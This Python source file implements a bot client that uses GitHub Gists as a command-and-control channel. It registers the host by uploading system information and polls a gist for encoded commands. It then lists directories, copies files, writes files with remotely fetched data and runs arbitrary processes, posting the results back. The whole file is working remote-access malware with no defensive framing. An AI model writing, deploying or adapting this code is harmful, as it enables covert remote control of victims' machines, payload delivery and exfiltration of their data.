import json
import os
import shutil
import subprocess
import threading
from collections import deque
from time import sleep

from gist import *
from util import *


class Bot:
    def __init__(self, token, command_fetch_interval=1, bot_id=None, init_datetime='1900-01-01T00:00:00Z'):
        self.id = bot_id
        self.api = GistApi(token)
        self.last_update = date(init_datetime)
        self.command_queue = deque()
        self.command_fetch_interval = int(command_fetch_interval)
        self.working = False

    def register(self):
        log_info("Registering the bot...")
        result = self.api.create({'register': {'content': str(sys_info())}}, 'bot')
        if not result.ok:
            log_error("Unable to register a bot: %s", result.text)
            return
        result = json.loads(result.text)
        if result['id']:
            log_info("Successfully registered. Bot id = %s", result['id'])
            self.id = result['id']
            self.last_update = date(result['updated_at'])
        else:
            log_error("Could not register a bot: %s", result)

    def fetch_commands(self):
        log_debug("Checking for new commands...")
        result = self.api.get(self.id)
        if not result.ok:
            log_error("Unable to fetch the command list: %s", result.text)
            self.working = False
            return
        result = json.loads(result.text)
        if date(result['updated_at']) <= self.last_update:
            log_debug("There is no new commands...")
            return
        log_info("Fetching new commands...")
        count = 0
        for file in result['files'].values():
            if file['filename'] == 'register' or file['size'] > 1:
                continue
            command = [file['filename'], decode_command(file['filename'])]
            self.command_queue.append(command)
            count += 1
        log_info("Fetched %d new commands.", count)
        self.last_update = date(result['updated_at'])

    def process_commands(self):
        while len(self.command_queue) > 0:
            command_id, command = self.command_queue.pop()
            command_result = self.execute_command(command)
            output = "\n%s\n%s" % (command, command_result)
            result = self.api.upsert_file(self.id, command_id, output)
            if not result.ok:
                log_error("Unable to process the command: %s", result.text)
                self.working = False
                return
            result = json.loads(result.text)
            self.last_update = date(result['updated_at'])

    def execute_command(self, command):
        log_info("Executing command %s...", command)
        command, args = command[0], command[1:]
        result = "unknown command"
        try:
            if command == 'ls':
                dst = args[0]
                result = str(os.listdir(dst))
            elif command == 'cp':
                src, dst = args
                result = str(shutil.copy(src, dst))
            elif command == 'dd':
                dst_file, data_file_id = args
                data = self.api.fetch_file(data_file_id, 'data').text
                with open(dst_file, 'wb') as f:
                    f.write(decode_command(data))
                result = "Created: " + dst_file
            elif command == 'exec':
                result = subprocess.Popen(args, stdout=subprocess.PIPE, stderr=subprocess.STDOUT).stdout.read()
                result = result.decode('utf-8')
        except Exception as e:
            result = str(e)
        log_info("%s", result)
        return result

    def run(self):
        self.working = True
        while self.working:
            self.fetch_commands()
            self.process_commands()
            sleep(self.command_fetch_interval)

    def start_daemon(self):
        if not self.id:
            log_error("Unable to start a bot: bot is not registered")
            return
        t = threading.Thread(target=self.run, daemon=True)
        t.start()
        return t


if __name__ == "__main__":
    log_level = os.getenv("LOG_LEVEL", log_level)
    if len(sys.argv) < 2:
        print("Usage: bot.py <gist_api_token> [<command_fetch_interval[s]> <bot_id> <init_datetime>]")
        exit(1)
    argv = sys.argv[1:]
    bs = Bot(*argv)
    if len(argv) < 3:
        bs.register()
    t = bs.start_daemon()
    sleep(1)
    if t:
        t.join()
